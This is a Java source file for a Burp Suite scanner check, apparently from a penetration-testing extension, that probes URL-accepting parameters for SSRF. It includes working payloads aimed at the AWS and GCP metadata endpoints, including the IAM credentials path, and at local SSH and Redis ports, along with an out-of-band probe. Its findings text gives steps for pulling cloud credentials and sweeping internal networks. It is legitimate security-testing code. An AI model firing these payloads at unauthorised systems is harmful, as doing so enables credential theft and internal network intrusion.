package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

/**
 * Tests parameters that typically accept a URL (webhook, callback, avatar,
 * import-file-by-URL, etc) against classic internal targets — especially the
 * cloud metadata endpoint (AWS/GCP/Azure) — and looks for response
 * signatures that confirm the SERVER made the request (SSRF).
 *
 * This is a content/error-based probe — for definitive confirmation in
 * environments without cloud metadata, complement it manually with Burp Collaborator.
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class SsrfCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {
            "url", "uri", "link", "target", "callback", "webhook", "src", "image",
            "avatar", "file_url", "feed", "proxy", "fetch", "path", "dest"
    };

    // payload -> expected signature in the response if the server really fetched the resource
    private static final Map<String, Pattern> INTERNAL_TARGETS = new LinkedHashMap<>();
    static {
        INTERNAL_TARGETS.put("http://169.254.169.254/latest/meta-data/",
                Pattern.compile("ami-id|instance-id|iam/security-credentials|local-hostname", Pattern.CASE_INSENSITIVE));
        INTERNAL_TARGETS.put("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                Pattern.compile("AccessKeyId|SecretAccessKey|Token", Pattern.CASE_INSENSITIVE));
        INTERNAL_TARGETS.put("http://metadata.google.internal/computeMetadata/v1/",
                Pattern.compile("project-id|instance|computeMetadata", Pattern.CASE_INSENSITIVE));
        INTERNAL_TARGETS.put("http://127.0.0.1:22",
                Pattern.compile("SSH-2\\.0|SSH-1\\.99"));
        INTERNAL_TARGETS.put("http://localhost:6379",
                Pattern.compile("-ERR|\\+PONG|redis_version"));
    }

    @Override
    public String name() {
        return "SSRF (URL-accepting parameters + cloud metadata)";
    }

    // Parameters used for the OOB-confirmed test (a subset, to avoid generating too
    // many probes — the content-based detection above already covers every PARAM_NAMES entry)
    private static final String[] PARAMS_FOR_OOB = {"url", "webhook", "callback", "src"};

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        return execute(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> findings = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- OOB confirmation via interactsh, when available ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
            for (String param : PARAMS_FOR_OOB) {
                try {
                    String host = ctx.interactsh().createProbe(
                            "SSRF confirmed via out-of-band interaction in parameter '" + param + "'",
                            Severity.CRITICAL,
                            base,
                            "The target server was induced to make a request to a unique test domain through " +
                                    "parameter '" + param + "', and that request was actually received — an unambiguous " +
                                    "confirmation of SSRF, even without cloud metadata or a specific exposed local service.",
                            "Validate and restrict the destinations of server-side requests to an allowlist, block internal/" +
                                    "link-local IP ranges, and disable automatic redirects on these calls.",
                            "1) Use this same unique test domain (regenerated on every scan) to confirm reproducibility. " +
                                    "2) Swap the payload to point at specific internal IPs/ports on the target's network, " +
                                    "keeping the same OOB channel type to confirm access to internal services.");
                    if (host != null) {
                        String payload = "http://" + host + "/rx0-ssrf-oob-probe";
                        String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Error firing SSRF OOB probe (param " + param + "): " + e.getMessage());
                }
            }
        }

        for (String param : PARAM_NAMES) {
            for (Map.Entry<String, Pattern> target : INTERNAL_TARGETS.entrySet()) {
                try {
                    String payload = target.getKey();
                    String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                    HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                    HttpResponse resp = api.http().sendRequest(req).response();
                    if (resp == null) continue;

                    String body = resp.bodyToString();
                    if (body == null) continue;

                    if (target.getValue().matcher(body).find()) {
                        findings.add(new Finding(
                                "Possible SSRF confirmed in parameter '" + param + "'",
                                Severity.CRITICAL,
                                url,
                                "Sending an internal/cloud-metadata URL in parameter '" + param + "' produced a response " +
                                        "containing content that could only exist if the SERVER had made the request behind the scenes — " +
                                        "i.e. the backend is fetching user-supplied URLs with no validation (SSRF).",
                                "Payload: " + payload + " | Signature found in the response: " + target.getValue().pattern(),
                                "Validate and restrict the destinations of server-side requests to an allowlist, block internal/link-local " +
                                        "IP ranges (169.254.0.0/16, 127.0.0.0/8, 10.0.0.0/8, etc) and disable automatic redirects on these calls.",
                                "1) Resend in Repeater with the same parameter '" + param + "' pointing at Burp Collaborator to confirm " +
                                        "out-of-band interaction. 2) If it's AWS, try reading full IAM credentials from " +
                                        "/latest/meta-data/iam/security-credentials/<role-name> (the name comes from the first response). " +
                                        "3) Try sweeping the internal network by swapping the host for other IPs/ports (e.g. 10.0.0.1:8080, 10.0.0.1:3306) " +
                                        "to map reachable internal services. 4) Cloud credentials obtained via SSRF usually turn into full account compromise."));
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Error in SSRF check (param " + param + "): " + e.getMessage());
                }
            }
        }
        return findings;
    }
}
